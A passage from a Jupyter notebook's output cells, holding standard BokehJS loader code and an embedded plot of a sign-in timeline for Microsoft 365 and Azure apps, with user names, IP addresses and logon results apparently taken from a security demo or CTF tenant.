cell.output_area._bokeh_server_id;\n\n    // Clean up Bokeh references\n    if (id != null) {\n      drop(id)\n    }\n\n    if (server_id !== undefined) {\n      // Clean up Bokeh references\n      const cmd_clean = \"from bokeh.io.state import curstate; print(curstate().uuid_to_server['\" + server_id + \"'].get_sessions()[0].document.roots[0]._id)\";\n      cell.notebook.kernel.execute(cmd_clean, {\n        iopub: {\n          output: function(msg) {\n            const id = msg.content.text.trim()\n            drop(id)\n          }\n        }\n      });\n      // Destroy server and session\n      const cmd_destroy = \"import bokeh.io.notebook as ion; ion.destroy_server('\" + server_id + \"')\";\n      cell.notebook.kernel.execute(cmd_destroy);\n    }\n  }\n\n  /**\n   * Handle when a new output is added\n   */\n  function handleAddOutput(event, handle) {\n    const output_area = handle.output_area;\n    const output = handle.output;\n\n    // limit handleAddOutput to display_data with EXEC_MIME_TYPE content only\n    if ((output.output_type != \"display_data\") || (!Object.prototype.hasOwnProperty.call(output.data, EXEC_MIME_TYPE))) {\n      return\n    }\n\n    const toinsert = output_area.element.find(\".\" + CLASS_NAME.split(' ')[0]);\n\n    if (output.metadata[EXEC_MIME_TYPE][\"id\"] !== undefined) {\n      toinsert[toinsert.length - 1].firstChild.textContent = output.data[JS_MIME_TYPE];\n      // store reference to embed id on output_area\n      output_area._bokeh_element_id = output.metadata[EXEC_MIME_TYPE][\"id\"];\n    }\n    if (output.metadata[EXEC_MIME_TYPE][\"server_id\"] !== undefined) {\n      const bk_div = document.createElement(\"div\");\n      bk_div.innerHTML = output.data[HTML_MIME_TYPE];\n      const script_attrs = bk_div.children[0].attributes;\n      for (let i = 0; i < script_attrs.length; i++) {\n        toinsert[toinsert.length - 1].firstChild.setAttribute(script_attrs[i].name, script_attrs[i].value);\n        toinsert[toinsert.length - 1].firstChild.textContent = bk_div.children[0].textContent\n      }\n      // store reference to server id on output_area\n      output_area._bokeh_server_id = output.metadata[EXEC_MIME_TYPE][\"server_id\"];\n    }\n  }\n\n  function register_renderer(events, OutputArea) {\n\n    function append_mime(data, metadata, element) {\n      // create a DOM node to render to\n      const toinsert = this.create_output_subarea(\n        metadata,\n        CLASS_NAME,\n        EXEC_MIME_TYPE\n      );\n      this.keyboard_manager.register_events(toinsert);\n      // Render to node\n      const props = {data: data, metadata: metadata[EXEC_MIME_TYPE]};\n      render(props, toinsert[toinsert.length - 1]);\n      element.append(toinsert);\n      return toinsert\n    }\n\n    /* Handle when an output is cleared or removed */\n    events.on('clear_output.CodeCell', handleClearOutput);\n    events.on('delete.Cell', handleClearOutput);\n\n    /* Handle when a new output is added */\n    events.on('output_added.OutputArea', handleAddOutput);\n\n    /**\n     * Register the mime type and append_mime function with output_area\n     */\n    OutputArea.prototype.register_mime_type(EXEC_MIME_TYPE, append_mime, {\n      /* Is output safe? */\n      safe: true,\n      /* Index of renderer in `output_area.display_order` */\n      index: 0\n    });\n  }\n\n  // register the mime type if in Jupyter Notebook environment and previously unregistered\n  if (root.Jupyter !== undefined) {\n    const events = require('base/js/events');\n    const OutputArea = require('notebook/js/outputarea').OutputArea;\n\n    if (OutputArea.prototype.mime_types().indexOf(EXEC_MIME_TYPE) == -1) {\n      register_renderer(events, OutputArea);\n    }\n  }\n  if (typeof (root._bokeh_timeout) === \"undefined\" || force === true) {\n    root._bokeh_timeout = Date.now() + 5000;\n    root._bokeh_failed_load = false;\n  }\n\n  const NB_LOAD_WARNING = {'data': {'text/html':\n     \"<div style='background-color: #fdd'>\\n\"+\n     \"<p>\\n\"+\n     \"BokehJS does not appear to have successfully loaded. If loading BokehJS from CDN, this \\n\"+\n     \"may be due to a slow or bad network connection. Possible fixes:\\n\"+\n     \"</p>\\n\"+\n     \"<ul>\\n\"+\n     \"<li>re-rerun `output_notebook()` to attempt to load from CDN again, or</li>\\n\"+\n     \"<li>use INLINE resources instead, as so:</li>\\n\"+\n     \"</ul>\\n\"+\n     \"<code>\\n\"+\n     \"from bokeh.resources import INLINE\\n\"+\n     \"output_notebook(resources=INLINE)\\n\"+\n     \"</code>\\n\"+\n     \"</div>\"}};\n\n  function display_loaded(error = null) {\n    const el = document.getElementById(\"effb5a83-498c-4f56-8da9-9d7550bdf0c8\");\n    if (el != null) {\n      const html = (() => {\n        if (typeof root.Bokeh === \"undefined\") {\n          if (error == null) {\n            return \"BokehJS is loading ...\";\n          } else {\n            return \"BokehJS failed to load.\";\n          }\n        } else {\n          const prefix = `BokehJS ${root.Bokeh.version}`;\n          if (error == null) {\n            return `${prefix} successfully loaded.`;\n          } else {\n            return `${prefix} <b>encountered errors</b> while loading and may not function as expected.`;\n          }\n        }\n      })();\n      el.innerHTML = html;\n\n      if (error != null) {\n        const wrapper = document.createElement(\"div\");\n        wrapper.style.overflow = \"auto\";\n        wrapper.style.height = \"5em\";\n        wrapper.style.resize = \"vertical\";\n        const content = document.createElement(\"div\");\n        content.style.fontFamily = \"monospace\";\n        content.style.whiteSpace = \"pre-wrap\";\n        content.style.backgroundColor = \"rgb(255, 221, 221)\";\n        content.textContent = error.stack ?? error.toString();\n        wrapper.append(content);\n        el.append(wrapper);\n      }\n    } else if (Date.now() < root._bokeh_timeout) {\n      setTimeout(() => display_loaded(error), 100);\n    }\n  }\n\n  function run_callbacks() {\n    try {\n      root._bokeh_onload_callbacks.forEach(function(callback) {\n        if (callback != null)\n          callback();\n      });\n    } finally {\n      delete root._bokeh_onload_callbacks\n    }\n    console.debug(\"Bokeh: all callbacks have finished\");\n  }\n\n  function load_libs(css_urls, js_urls, callback) {\n    if (css_urls == null) css_urls = [];\n    if (js_urls == null) js_urls = [];\n\n    root._bokeh_onload_callbacks.push(callback);\n    if (root._bokeh_is_loading > 0) {\n      console.debug(\"Bokeh: BokehJS is being loaded, scheduling callback at\", now());\n      return null;\n    }\n    if (js_urls == null || js_urls.length === 0) {\n      run_callbacks();\n      return null;\n    }\n    console.debug(\"Bokeh: BokehJS not loaded, scheduling load and callback at\", now());\n    root._bokeh_is_loading = css_urls.length + js_urls.length;\n\n    function on_load() {\n      root._bokeh_is_loading--;\n      if (root._bokeh_is_loading === 0) {\n        console.debug(\"Bokeh: all BokehJS libraries/stylesheets loaded\");\n        run_callbacks()\n      }\n    }\n\n    function on_error(url) {\n      console.error(\"failed to load \" + url);\n    }\n\n    for (let i = 0; i < css_urls.length; i++) {\n      const url = css_urls[i];\n      const element = document.createElement(\"link\");\n      element.onload = on_load;\n      element.onerror = on_error.bind(null, url);\n      element.rel = \"stylesheet\";\n      element.type = \"text/css\";\n      element.href = url;\n      console.debug(\"Bokeh: injecting link tag for BokehJS stylesheet: \", url);\n      document.body.appendChild(element);\n    }\n\n    for (let i = 0; i < js_urls.length; i++) {\n      const url = js_urls[i];\n      const element = document.createElement('script');\n      element.onload = on_load;\n      element.onerror = on_error.bind(null, url);\n      element.async = false;\n      element.src = url;\n      console.debug(\"Bokeh: injecting script tag for BokehJS library: \", url);\n      document.head.appendChild(element);\n    }\n  };\n\n  function inject_raw_css(css) {\n    const element = document.createElement(\"style\");\n    element.appendChild(document.createTextNode(css));\n    document.body.appendChild(element);\n  }\n\n  const js_urls = [\"https://cdn.bokeh.org/bokeh/release/bokeh-3.7.3.min.js\", \"https://cdn.bokeh.org/bokeh/release/bokeh-gl-3.7.3.min.js\", \"https://cdn.bokeh.org/bokeh/release/bokeh-widgets-3.7.3.min.js\", \"https://cdn.bokeh.org/bokeh/release/bokeh-tables-3.7.3.min.js\", \"https://cdn.bokeh.org/bokeh/release/bokeh-mathjax-3.7.3.min.js\"];\n  const css_urls = [];\n\n  const inline_js = [    function(Bokeh) {\n      Bokeh.set_log_level(\"info\");\n    },\nfunction(Bokeh) {\n    }\n  ];\n\n  function run_inline_js() {\n    if (root.Bokeh !== undefined || force === true) {\n      try {\n            for (let i = 0; i < inline_js.length; i++) {\n      inline_js[i].call(root, root.Bokeh);\n    }\n\n      } catch (error) {display_loaded(error);throw error;\n      }if (force === true) {\n        display_loaded();\n      }} else if (Date.now() < root._bokeh_timeout) {\n      setTimeout(run_inline_js, 100);\n    } else if (!root._bokeh_failed_load) {\n      console.log(\"Bokeh: BokehJS failed to load within specified timeout.\");\n      root._bokeh_failed_load = true;\n    } else if (force !== true) {\n      const cell = $(document.getElementById(\"effb5a83-498c-4f56-8da9-9d7550bdf0c8\")).parents('.cell').data().cell;\n      cell.output_area.append_execute_result(NB_LOAD_WARNING)\n    }\n  }\n\n  if (root._bokeh_is_loading === 0) {\n    console.debug(\"Bokeh: BokehJS loaded, going straight to plotting\");\n    run_inline_js();\n  } else {\n    load_libs(css_urls, js_urls, function() {\n      console.debug(\"Bokeh: BokehJS plotting callback run at\", now());\n      run_inline_js();\n    });\n  }\n}(window));",
      "application/vnd.bokehjs_load.v0+json": ""
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "\n",
       "  <div id=\"bc4a629e-5670-441c-b274-a2b55f608601\" data-root-id=\"p2581\" style=\"display: contents;\"></div>\n"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/javascript": "(function(root) {\n  function embed_document(root) {\n  const docs_json = {\"33d0e57f-79f3-426c-8dc0-bbf1865b12c3\":{\"version\":\"3.7.3\",\"title\":\"Bokeh Application\",\"roots\":[{\"type\":\"object\",\"name\":\"Column\",\"id\":\"p2581\",\"attributes\":{\"children\":[{\"type\":\"object\",\"name\":\"Figure\",\"id\":\"p2411\",\"attributes\":{\"width\":900,\"height\":300,\"x_range\":{\"type\":\"object\",\"name\":\"Range1d\",\"id\":\"p2421\",\"attributes\":{\"start\":1755239052715.6328,\"end\":1755294178766.833}},\"y_range\":{\"type\":\"object\",\"name\":\"Range1d\",\"id\":\"p2422\",\"attributes\":{\"start\":-0.5,\"end\":1.5}},\"x_scale\":{\"type\":\"object\",\"name\":\"LinearScale\",\"id\":\"p2423\"},\"y_scale\":{\"type\":\"object\",\"name\":\"LinearScale\",\"id\":\"p2424\"},\"title\":{\"type\":\"object\",\"name\":\"Title\",\"id\":\"p2414\",\"attributes\":{\"text\":\"Timeline: Logon Events by User\"}},\"renderers\":[{\"type\":\"object\",\"name\":\"GlyphRenderer\",\"id\":\"p2566\",\"attributes\":{\"data_source\":{\"type\":\"object\",\"name\":\"ColumnDataSource\",\"id\":\"p2370\",\"attributes\":{\"selected\":{\"type\":\"object\",\"name\":\"Selection\",\"id\":\"p2371\",\"attributes\":{\"indices\":[],\"line_indices\":[]}},\"selection_policy\":{\"type\":\"object\",\"name\":\"UnionRenderers\",\"id\":\"p2372\"},\"data\":{\"type\":\"map\",\"entries\":[[\"index\",{\"type\":\"ndarray\",\"array\":{\"type\":\"bytes\",\"data\":\"SQAAAEoAAAA=\"},\"shape\":[2],\"dtype\":\"int32\",\"order\":\"little\"}],[\"AppDisplayName\",{\"type\":\"ndarray\",\"array\":[\"Office 365 SharePoint Online\",\"Office 365 SharePoint Online\"],\"shape\":[2],\"dtype\":\"object\",\"order\":\"little\"}],[\"UserPrincipalName\",{\"type\":\"ndarray\",\"array\":[\"meganb@seccxp.ninja\",\"meganb@seccxp.ninja\"],\"shape\":[2],\"dtype\":\"object\",\"order\":\"little\"}],[\"Result\",{\"type\":\"ndarray\",\"array\":[\"Failed\",\"Failed\"],\"shape\":[2],\"dtype\":\"object\",\"order\":\"little\"}],[\"IPAddress\",{\"type\":\"ndarray\",\"array\":[\"136.55.145.135\",\"136.55.145.135\"],\"shape\":[2],\"dtype\":\"object\",\"order\":\"little\"}],[\"TimeGenerated\",{\"type\":\"ndarray\",\"array\":{\"type\":\"bytes\",\"data\":\"uhNu4NqKeUK6E27g2op5Qg==\"},\"shape\":[2],\"dtype\":\"float64\",\"order\":\"little\"}],[\"y_index\",{\"type\":\"ndarray\",\"array\":{\"type\":\"bytes\",\"data\":\"AAAAAAAAAAA=\"},\"shape\":[2],\"dtype\":\"int32\",\"order\":\"little\"}]]}}},\"view\":{\"type\":\"object\",\"name\":\"CDSView\",\"id\":\"p2567\",\"attributes\":{\"filter\":{\"type\":\"object\",\"name\":\"AllIndices\",\"id\":\"p2568\"}}},\"glyph\":{\"type\":\"object\",\"name\":\"Scatter\",\"id\":\"p2563\",\"attributes\":{\"x\":{\"type\":\"field\",\"field\":\"TimeGenerated\"},\"y\":{\"type\":\"field\",\"field\":\"y_index\"},\"size\":{\"type\":\"value\",\"value\":10},\"line_color\":{\"type\":\"value\",\"value\":\"#440154\"},\"line_alpha\":{\"type\":\"value\",\"value\":0.5},\"fill_color\":{\"type\":\"value\",\"value\":\"#440154\"},\"fill_alpha\":{\"type\":\"value\",\"value\":0.5},\"hatch_color\":{\"type\":\"value\",\"value\":\"#440154\"},\"hatch_alpha\":{\"type\":\"value\",\"value\":0.5},\"marker\":{\"type\":\"value\",\"value\":\"diamond\"}}},\"nonselection_glyph\":{\"type\":\"object\",\"name\":\"Scatter\",\"id\":\"p2564\",\"attributes\":{\"x\":{\"type\":\"field\",\"field\":\"TimeGenerated\"},\"y\":{\"type\":\"field\",\"field\":\"y_index\"},\"size\":{\"type\":\"value\",\"value\":10},\"line_color\":{\"type\":\"value\",\"value\":\"#440154\"},\"line_alpha\":{\"type\":\"value\",\"value\":0.1},\"fill_color\":{\"type\":\"value\",\"value\":\"#440154\"},\"fill_alpha\":{\"type\":\"value\",\"value\":0.1},\"hatch_color\":{\"type\":\"value\",\"value\":\"#440154\"},\"hatch_alpha\":{\"type\":\"value\",\"value\":0.1},\"marker\":{\"type\":\"value\",\"value\":\"diamond\"}}},\"muted_glyph\":{\"type\":\"object\",\"name\":\"Scatter\",\"id\":\"p2565\",\"attributes\":{\"x\":{\"type\":\"field\",\"field\":\"TimeGenerated\"},\"y\":{\"type\":\"field\",\"field\":\"y_index\"},\"size\":{\"type\":\"value\",\"value\":10},\"line_color\":{\"type\":\"value\",\"value\":\"#440154\"},\"line_alpha\":{\"type\":\"value\",\"value\":0.2},\"fill_color\":{\"type\":\"value\",\"value\":\"#440154\"},\"fill_alpha\":{\"type\":\"value\",\"value\":0.2},\"hatch_color\":{\"type\":\"value\",\"value\":\"#440154\"},\"hatch_alpha\":{\"type\":\"value\",\"value\":0.2},\"marker\":{\"type\":\"value\",\"value\":\"diamond\"}}}}},{\"type\":\"object\",\"name\":\"GlyphRenderer\",\"id\":\"p2576\",\"attributes\":{\"data_source\":{\"type\":\"object\",\"name\":\"ColumnDataSource\",\"id\":\"p2373\",\"attributes\":{\"selected\":{\"type\":\"object\",\"name\":\"Selection\",\"id\":\"p2374\",\"attributes\":{\"indices\":[],\"line_indices\":[]}},\"selection_policy\":{\"type\":\"object\",\"name\":\"UnionRenderers\",\"id\":\"p2375\"},\"data\":{\"type\":\"map\",\"entries\":[[\"index\",{\"type\":\"ndarray\",\"array\":{\"type\":\"bytes\",\"data\":\"AgAAAAMAAAAJAAAAFgAAACUAAAAnAAAALgAAADoAAABBAAAAYAAAAGkAAABqAAAAbgAAAHgAAACkAAAAqgAAALcAAAC5AAAAwQAAANkAAADaAAAA4AAAAOEAAADiAAAA8AAAAPcAAAA3AQAAOQEAAD0BAABaAQAAXgEAAGABAABhAQAApAEAAKgBAACxAQAAsgEAALMBAAC0AQAAtQEAALYBAAC3AQAAuwEAAL4BAADMAQAAzQEAAM8BAADQAQAA0QEAANIBAADTAQAA1AEAANUBAADWAQAA1wEAANgBAADbAQAA3QEAAN4BAAAVAgAAFgIAADICAAAzAgAANAIAADUCAAA2AgAANwIAAE8CAABeAgAAYgIAAGMCAABuAgAAcAIAAHMCAAB9AgAAjAIAAJICAACgAgAApAIAAKsCAACsAgAAsgIAALUCAADAAgAA\"},\"shape\":[84],\"dtype\":\"int32\",\"order\":\"little\"}],[\"AppDisplayName\",{\"type\":\"ndarray\",\"array\":[\"Azure Portal\",\"Azure Portal\",\"Azure Portal\",\"Azure Portal\",\"Azure Portal\",\"Azure Portal\",\"Azure Portal\",\"Azure Portal\",\"Office 365 Exchange Online\",\"Office 365 Exchange Online\",\"Microsoft 365 Security and Compliance Center\",\"Office365 Shell WCSS-Client\",\"Azure Portal\",\"Microsoft Forms\",\"Azure Portal\",\"Office365 Shell WCSS-Client\",\"Microsoft 365 Security and Compliance Center\",\"Office365 Shell WCSS-Client\",\"Office365 Shell WCSS-Client\",\"Office365 Shell WCSS-Client\",\"Office365 Shell WCSS-Client\",\"Microsoft Cloud App Security\",\"Office365 Shell WCSS-Client\",\"Microsoft Cloud App Security\",\"Office365 Shell WCSS-Client\",\"Skype Web Experience On Office 365\",\"Skype Web Experience On Office 365\",\"Microsoft Stream Portal\",\"Office365 Shell WCSS-Client\",\"Office365 Shell WCSS-Client\",\"Office365 Shell WCSS-Client\",\"Skype Web Experience On Office 365\",\"Skype Web Experience On Office 365\",\"O365 Suite UX\",\"O365 Suite UX\",\"Office 365 Exchange Online\",\"Office365 Shell WCSS-Client\",\"Skype Web Experience On Office 365\",\"Skype Web Experience On Office 365\",\"Office365 Shell WCSS-Client\",\"Office365 Shell WCSS-Client\",\"Office365 Shell WCSS-Client\",\"Office 365 Exchange Online\",\"Skype Web Experience On Office 365\",\"Office 365 SharePoint Online\",\"SharePoint Online Web Client Extensibility\",\"Office 365 SharePoint Online\",\"Office365 Shell WCSS-Client\",\"Office365 Shell WCSS-Client\",\"Office365 Shell WCSS-Client\",\"Skype Web Experience On Office 365\",\"Office365 Shell WCSS-Client\",\"Skype Web Experience On Office 365\",\"Office365 Shell WCSS-Client\",\"Skype Web Experience On Office 365\",\"SharePoint Online Web Client Extensibility\",\"Office365 Shell WCSS-Client\",\"Skype Web Experience On Office 365\",\"Microsoft Forms\",\"Azure Portal\",\"Azure Portal\",\"Office365 Shell WCSS-Client\",\"Office365 Shell WCSS-Client\",\"Office365 Shell WCSS-Client\",\"Office 365 Exchange Online\",\"Office365 Shell WCSS-Client\",\"Microsoft 365 Security and Compliance Center\",\"Microsoft 365 Security and Compliance Center\",\"Office 365 Exchange Online\",\"Microsoft Stream Portal\",\"Office365 Shell WCSS-Client\",\"Microsoft Cloud App Security\",\"Microsoft Cloud App Security\",\"Microsoft Cloud App Security\",\"Microsoft Cloud App Security\",\"Microsoft Cloud App Security\",\"Office365 Shell WCSS-Client\",\"Office365 Shell WCSS-Client\",\"Office365 Shell WCSS-Client\",\"Microsoft 365 Security and Compliance Center\",\"Office365 Shell WCSS-Client\",\"Office365 Shell WCSS-Client\",\"Office365 Shell WCSS-Client\",\"Office365 Shell WCSS-Client\"],\"shape\":[84],\"dtype\":\"object\",\"order\":\"little\"}],[\"UserPrincipalName\",{\"type\":\"ndarray\",\"array\":[\"ctfuser3@seccxp.ninja\",\"zvon@seccxp.ninja\",\"zvon@seccxp.ninja\",\"ctfuser3@seccxp.ninja\",\"ctfuser3@seccxp.ninja\",\"ctfuser3@seccxp.ninja\",\"zvon@seccxp.ninja\",\"zvon@seccxp.ninja\",\"demo@seccxp.ninja\",\"demo@seccxp.ninja\",\"demo@seccxp.ninja\",\"demo@seccxp.ninja\",\"ctfuser3@seccxp.ninja\",\"caroline@seccxp.ninja\",\"ctfuser3@seccxp.ninja\",\"seb@seccxp.ninja\",\"demo@seccxp.ninja\",\"demo@seccxp.ninja\",\"demo@seccxp.ninja\",\"meganb@seccxp.ninja\",\"meganb@seccxp.ninja\",\"demo@seccxp.ninja\",\"demo@seccxp.ninja\",\"demo@seccxp.ninja\",\"demo@seccxp.ninja\",\"meganb@seccxp.ninja\",\"meganb@seccxp.ninja\",\"seb@seccxp.ninja\",\"seb@seccxp.ninja\",\"seb@seccxp.ninja\",\"seb@seccxp.ninja\",\"seb@seccxp.ninja\",\"seb@seccxp.ninja\",\"meganb@seccxp.ninja\",\"meganb@seccxp.ninja\",\"meganb@seccxp.ninja\",\"meganb@seccxp.ninja\",\"meganb@seccxp.ninja\",\"meganb@seccxp.ninja\",\"meganb@seccxp.ninja\",\"meganb@seccxp.ninja\",\"meganb@seccxp.ninja\",\"meganb@seccxp.ninja\",\"meganb@seccxp.ninja\",\"seb@seccxp.ninja\",\"seb@seccxp.ninja\",\"seb@seccxp.ninja\",\"seb@seccxp.ninja\",\"seb@seccxp.ninja\",\"seb@seccxp.ninja\",\"seb@seccxp.ninja\",\"seb@seccxp.ninja\",\"seb@seccxp.ninja\",\"seb@seccxp.ninja\",\"seb@seccxp.ninja\",\"seb@seccxp.ninja\",\"seb@seccxp.ninja\",\"seb@seccxp.ninja\",\"caroline@seccxp.ninja\",\"seb@seccxp.ninja\",\"seb@seccxp.ninja\",\"seb@seccxp.ninja\",\"seb@seccxp.ninja\",\"seb@seccxp.ninja\",\"seb@seccxp.ninja\",\"seb@seccxp.ninja\",\"seb@seccxp.ninja\",\"seb@seccxp.ninja\",\"seb@seccxp.ninja\",\"seb@seccxp.ninja\",\"seb@seccxp.ninja\",\"seb@seccxp.ninja\",\"seb@seccxp.ninja\",\"seb@seccxp.ninja\",\"seb@seccxp.ninja\",\"seb@seccxp.ninja\",\"seb@seccxp.ninja\",\"seb@seccxp.ninja\",\"seb@seccxp.ninja\",\"seb@seccxp.ninja\",\"seb@seccxp.ninja\",\"seb@seccxp.ninja\",\"seb@seccxp.ninja\",\"seb@seccxp.ninja\"],\"shape\":[84],\"dtype\":\"object\",\"order\":\"little\"}],[\"Result\",{\"type\":\"ndarray\",\"array\":[\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\",\"Sucess\"],\"shape\":[84],\"dtype\":\"object\",\"order\":\"little\"}],[\"IPAddress\",{\"type\":\"ndarray\",\"array\":[\"24.13.212.221\",\"24.16.133.227\",\"24.16.133.227\",\"24.13.212.221\",\"73.226.223.252\",\"73.226.223.252\",\"24.16.133.227\",\"24.16.133.227\",\"73.35.204.105\",\"73.35.204.105\",\"73.35.204.105\",\"73.35.204.105\",\"73.226.223.252\",\"136.55.145.135\",\"73.226.223.252\",\"109.88.218.99\",\"73.35.204.105\",\"73.35.204.105\",\"73.35.204.105\",\"109.88.218.99\",\"109.88.218.99\",\"73.35.204.105\",\"73.35.204.105\",\"73.35.204.105\",\"73.35.204.105\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\",\"136.55.145.135\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\",\"109.88.218.99\"],\"shape\":[84],\"dtype\":\"object\",\"order\":\"little\"}],[\"TimeGenerated\",{\"type\":\"ndarray\",\"array\":{\"type\":\"bytes\",\"data\":\"upPzS/GKeUK60z4U8op5QrrTPhTyinlCupPzS/GKeUK6M6EX7Yp5QrozoRftinlCuuPupOWKeUK64+6k5Yp5Qrpj7iPninlCumPuI+eKeUK6c20i54p5QrrjKCTninlCupNIF+2KeUK609Hx4op5QrqTSBftinlCumMhy8qKeUK6c20i54p5QrpzKiTninlCuvP1I+eKeUK6k3TL34p5QrqTdMvfinlCulM9aueKeUK64ygk54p5QrpTPWrninlCunMqJOeKeUK600XM34p5QrpjysvfinlCurOMduGKeUK64xKQ4op5QrqDoYriinlCutOPiuKKeUK6Y9eK4op5QroDHoviinlCunPWs9+KeUK6c9az34p5QrqDEcffinlCulOCyt+KeUK6A77K34p5QroDvsrfinlCulOCyt+KeUK6cw3L34p5QrpzDcvfinlCuoMRx9+KeUK6Y8rL34p5QrozmIviinlCutPxjuKKeUK6M5iL4op5QrqDoYriinlCuuMSkOKKeUK6wxWK4op5Qrpj14riinlCutOPiuKKeUK6M1mK4op5QrrzoIriinlCujNZiuKKeUK60/GO4op5QrrzoIriinlCugMei+KKeUK609Hx4op5QrqDIZL2inlCuoMhkvaKeUK6A3nLyop5QrrDdMvKinlCumMhy8qKeUK6s1rLyop5QroDecvKinlCupPlyMqKeUK6k+XIyop5QrqzWsvKinlCurOMduGKeUK6wxWK4op5QroT+1j1inlCuhP7WPWKeUK6E1KY9op5Qrqztl3LinlCurO2XcuKeUK6w3TLyop5Qrpz42LQinlCulPxYtCKeUK6swhg0Ip5QrpDi2LQinlCunPjYtCKeUK6U/Fi0Ip5QrpDi2LQinlC\"},\"shape\":[84],\"dtype\":\"float64\",\"order\":\"little\"}],[\"y_index\",{\"type\":\"ndarray\",\"array\":{\"type\":\"bytes\",\"data\":\"AQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAAAQAAAAEAAAABAAAA\"},\"shape\":[84],\"dtype\":\"int32\",\"order\":\"little\"}]]}}},\"view\":{\"type\":\"object\",\"name\":\"CDSView\",\"id\":\"p2577\",\"attributes\":{\"filter\":{\"type\":\"object\",\"name\":\"AllIndices\",\"id\":\"p2578\"}}},\"glyph\":{\"type\":\"object\",\"name\":\"Scatter\",\"id\":\"p2573\",\"attributes\":{\"x\":{\"type\":\"field\",\"field\":\"TimeGenerated\"},\"y\":{\"type\":\"field\",\"field\":\"y_index\"},\"size\":{\"type\":\"value\",\"value\":10},\"line_color\":{\"type\":\"value\",\"value\":\"#FDE724\"},\"line_alpha\":{\"type\":\"value\",\"value\":0.5},\"fill_color\":{\"type\":\"value\",\"value\":\"#FDE724\"},\"fill_alpha\":{\"type\":\"value\",\"value\":0.5},\"hatch_color\":{\"type\":\"value\",\"value\":\"#FDE724\"},\"hatch_alpha\":{\"type\":\"value\",\"value\":0.5},\"marker\":{\"type\":\"value\",\"value\":\"diamond\"}}},\"nonselection_glyph\":{\"type\":\"object\",\"name\":\"Scatter\",\"id\":\"p2574\",\"attributes\":{\"x\":{\"type\":\"field\",\"field\":\"TimeGenerated\"},\"y\":{\"type\":\"field\",\"field\":\"y_index\"},\"size\":{\"type\":\"value\",\"value\":10},\"line_color\":{\"type\":\"value\",\"value\":\"#FDE724\"},\"line_alpha\":{\"type\":\"value\",\"value\":0.1},\"fill_color\":{\"type\":\"value\",\"value\":\"#FDE724\"},\"fill_alpha\":{\"type\":\"value\",\"value\":0.1},\"hatch_color\":{\"type\":\"value\",\"value\":\"#FDE724\"},\"hatch_alpha\":{\"type\":\"value\",\"value\":0.1},\"marker\":{\"type\":\"value\",\"value\":\"diamond\"}}},\"muted_glyph\":{\"type\":\"object\",\"name\":\"Scatter\",\"id\":\"p2575\",\"attributes\":{\"x\":{\"type\":\"field\",\"field\":\"TimeGenerated\"},\"y\":{\"type\":\"field\",\"field\":\"y_index\"},\"size\":{\"type\":\"value\",\"value\":10},\"line_color\":{\"type\":\"value\",\"value\":\"#FDE724\"},\"line_alpha\":{\"type\":\"value\",\"value\":0.2},\"fill_color\":{\"type\":\"value\",\"value\":\"#FDE724\"},\"fill_alpha\":{\"type\":\"value\",\"value\":0.2},\"hatch_color\":{\"type\":\"value\",\"value\":\"#FDE724\"},\"hatch_alpha\":{\"type\":\"value\",\"value\":0.2},\"marker\":{\"type\":\"value\",\"value\":\"diamond\"}}}}}],\"toolbar\":{\"type\":\"o